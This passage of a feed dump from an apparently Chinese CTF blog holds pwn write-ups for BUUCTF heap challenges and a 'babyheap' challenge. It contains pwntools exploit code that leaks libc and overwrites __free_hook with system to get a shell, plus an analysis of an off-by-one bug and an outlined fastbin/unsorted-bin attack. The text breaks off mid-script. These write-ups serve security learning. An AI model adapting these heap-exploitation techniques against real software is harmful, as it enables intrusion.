punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chapter<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_section</span><span class="token punctuation">(</span>chapter<span class="token punctuation">,</span> section<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"into:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>chapter<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>    section_ptr <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>section<span class="token punctuation">)</span>    <span class="token keyword">return</span> section_ptr<span class="token keyword">def</span> <span class="token function">add_text</span><span class="token punctuation">(</span>section<span class="token punctuation">,</span> size<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"into:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>section<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"write:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Text:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">remove_chapter</span><span class="token punctuation">(</span>chapter<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>chapter<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">remove_section</span><span class="token punctuation">(</span>section<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>section<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">remove_text</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"6"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">preview</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"7"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">update_text</span><span class="token punctuation">(</span>section<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"8"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Text):"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"Text"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>section<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"New Text:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>text<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Name of the book you want to create: '</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span>add_chapter<span class="token punctuation">(</span><span class="token string">'aaaa\n'</span><span class="token punctuation">)</span>add_section<span class="token punctuation">(</span><span class="token string">'aaaa\n'</span><span class="token punctuation">,</span> <span class="token string">'bbbb\n'</span><span class="token punctuation">)</span>add_section<span class="token punctuation">(</span><span class="token string">'aaaa\n'</span><span class="token punctuation">,</span> <span class="token string">'cccc\n'</span><span class="token punctuation">)</span>add_text<span class="token punctuation">(</span><span class="token string">'bbbb\n'</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>add_text<span class="token punctuation">(</span><span class="token string">'cccc\n'</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'here\n'</span><span class="token punctuation">)</span>remove_text<span class="token punctuation">(</span><span class="token string">'bbbb\n'</span><span class="token punctuation">)</span>add_text<span class="token punctuation">(</span><span class="token string">'bbbb\n'</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'\x78'</span><span class="token punctuation">)</span>preview<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Section:bbbb'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Text:'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4b78</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add_section<span class="token punctuation">(</span><span class="token string">'aaaa\n'</span><span class="token punctuation">,</span> <span class="token string">'dddd\n'</span><span class="token punctuation">)</span>update_text<span class="token punctuation">(</span><span class="token string">'cccc\n'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\0'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span> <span class="token operator">+</span>            <span class="token string">'dddd'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>update_text<span class="token punctuation">(</span><span class="token string">'dddd\n'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>remove_text<span class="token punctuation">(</span><span class="token string">'cccc\n'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>保护全开的堆题利用第一步就是得先泄露libc地址，通过addtext，removetext，addtext，preview这四步就能泄露出libc地址</p><p>然后再add一个sectionchunk，sectionname为dddd，这个section紧接着textcccc，然后update textcccc，通过堆溢出，将sectiondddd+32的位置处写入free_hook的地址，这样，当我们编辑sectiondddd的text时，就相当于编辑free_hook，只需要往其中写入system，然后remove textcccc即可getshell</p><p>以后还是得仔细分析程序，无论是这种功能很多的堆题，还是vmpwn，只要c语言基础足够扎实，就算分析得慢，也还是能搞定的。</p><h2 id="0x10-ciscn-2019-final-4"><a href="#0x10-ciscn-2019-final-4" class="headerlink" title="0x10.ciscn_2019_final_4"></a>0x10.ciscn_2019_final_4</h2><p>这题知识点挺多，不错的题目</p><p>首先检查保护</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/32.jpg" alt=""></p><p>除了PIE其他的保护都开启</p><p>接下来分析程序，祭出IDA</p><p>程序没有去除符号表，降低了分析难度</p><p>在进入菜单循环之前有这么一段代码</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/33.jpg" alt=""></p><p>首先fork一个子进程，</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x1-gyctf-2020-signin&quot;&gt;&lt;a href=&quot;#0x1-gyctf-2020-signin&quot; class=&quot;headerlink&quot; title=&quot;0x1.gyctf_2020_signin&quot;&gt;&lt;/a&gt;0x1.gyctf_2020_signin&lt;/h2&gt;&lt;p&gt;环境是2.27.这题的考点在于，&lt;strong&gt;calloc&lt;/strong&gt;不会从tcache中取chunk，而是直接从fastbin中取，并且会将fastbin中剩余的chunk链入tcache&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://lawliet.ren/categories/CTF/"/>
    
    
      <category term="PWN" scheme="https://lawliet.ren/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>PWN学习记录</title>
    <link href="https://lawliet.ren/2020/04/09/pwn-xue-xi-ji-lu/"/>
    <id>https://lawliet.ren/2020/04/09/pwn-xue-xi-ji-lu/</id>
    <published>2020-04-09T04:56:15.000Z</published>
    <updated>2020-04-10T06:08:57.277Z</updated>
    
    <content type="html"><![CDATA[<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>考察点:unsortedbin attack,house of sprit,global_max_fast,fastbin attack</p><a id="more"></a><p>按照流程，首先checksec<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/1.jpg" alt=""><br>保护全开的堆题，并且由于开启了Full RELRO，所以我们不能通过复写got表来getshell<br>运行一下，看看程序如何运行<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/2.jpg" alt=""><br>菜单题，增删查改一样不少，然后我们把程序拖进IDA看看<br>首先是main函数</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//main</span>__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  __int64 savedregs<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp+0h]</span>  v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">sub_EC6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v4 <span class="token operator">!=</span> <span class="token number">5</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v4 <span class="token operator">=</span> <span class="token function">sub_B0A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>savedregs <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1u</span><span class="token punctuation">:</span>        <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2u</span><span class="token punctuation">:</span>        <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3u</span><span class="token punctuation">:</span>        <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4u</span><span class="token punctuation">:</span>        <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5u</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid option!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">puts</span><span class="token punctuation">(</span>byte_1168<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>main函数开头有一个sub_EC6()函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_EC6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">0x3Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">mallopt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"WELCOME!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>其中的mallopt(1,0)规定了global_max_fast的大小为0，这样即是限制了fastbin的最大大小为0，即不允许使用fastbin<br>再看到add函数</p><pre class=" language-c"><code class="language-c">v2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">0xF</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>qword_202060<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v2 <span class="token operator">=</span> i<span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Error: Don't have enough space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">sub_B0A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> v3 <span class="token operator">></span> <span class="token number">0x6F</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The size is wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"data: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_A8A</span><span class="token punctuation">(</span>qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>最大允许add chunk16次，并且允许申请的最大的chunk大小为0x6f</p><p>delete函数</p><pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v1 <span class="token operator">=</span> <span class="token function">sub_B0A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v1 <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">></span> <span class="token number">0xF</span> <span class="token operator">||</span> <span class="token operator">!</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Error: Invalid index!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>delete函数没有问题，free之后同时将指针清零</p><p>edit函数</p><pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v2 <span class="token operator">=</span> <span class="token function">sub_B0A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> v2 <span class="token operator">></span> <span class="token number">0xF</span> <span class="token operator">||</span> <span class="token operator">!</span>qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Error: Invalid index!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"data: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v0 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sub_A8A</span><span class="token punctuation">(</span>qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>其中的sub_A8A存在off-by-one漏洞<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/3.jpg" alt=""></p><p>show函数</p><pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v1 <span class="token operator">=</span> <span class="token function">sub_B0A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v1 <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">></span> <span class="token number">0xF</span> <span class="token operator">||</span> <span class="token operator">!</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Error: Invalid index!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>没什么好说的，通过序号输出chunk的内容</p><p>整理一下我们的信息<br>1.无法使用fastbin attack<br>2.最大只允许分配0x6f大小的chunk<br>3.存在off-by-one漏洞<br>大概思路如下:通过unsorted bin attack修改global_max_fast的大小，是fastbin开启，然后通过fastbin attack修改malloc_hook为one_gadget</p><p>先封装好我们要用到的一些函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>首先让我们来泄露libc基地址<br>我们创建5个chunk，第一个用来off-by-one，第二三四个用来合并，第五个防止前面的chunk和topchunk合并<br>我们将chunk1(编号从0开始)的size修改为chunk123的和，然后free掉，再add一个chunk1大小的chunk，这样main_arena的地址就到了chunk2里面，然后show(2)即可leak出地址</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token 